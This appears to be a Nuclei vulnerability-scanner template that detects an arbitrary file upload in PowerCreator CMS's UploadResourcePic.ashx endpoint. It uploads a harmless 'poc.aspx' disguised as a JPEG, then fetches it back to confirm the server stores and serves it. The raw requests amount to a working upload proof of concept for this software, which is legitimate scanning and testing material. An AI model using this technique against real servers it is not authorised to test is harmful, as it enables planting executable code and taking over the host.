id: powercreator-UploadResourcePic-fileupload
info:
  name: PowerCreator UploadResourcePic.ashx - fileupload
  author: leadlife
  severity: critical
  description: 
  reference: 
    - https://github.com/ExpLangcn/NucleiTP/blob/2b7ecb9031a6eda4f272793045f29b339d8e0cce/critical/powercreator-cms-rce.yaml#L22
  classification:
    cve-id: 
  metadata:
    verified: true
    fofa-query: demo
  tags: powercreator,fileupload

http:
  - raw:
      - |
        POST /upload/UploadResourcePic.ashx?ResourceID=8382 HTTP/1.1
        Host: {{Hostname}}
        Content-Disposition: form-data;name="file1";filename="poc.aspx";
        Content-Type: multipart/form-data; boundary=---------------------------20873900192357278038549710136

        -----------------------------20873900192357278038549710136
        Content-Disposition: form-data; name="file1"; filename="poc.aspx"
        Content-Type: image/jpeg

        {{randstr}}
        -----------------------------20873900192357278038549710136--
      - |
        GET /ResourcePic/{{endpoint}} HTTP/1.1
        Host: {{Hostname}}
    extractors:
      - type: regex
        name: endpoint
        internal: true
        part: body
        regex:
          - "(.*?.ASPX)"
    req-condition: true
    matchers:
      - type: dsl
        dsl:
          - "contains(body_2, '{{randstr}}') && status_code_2 == 200"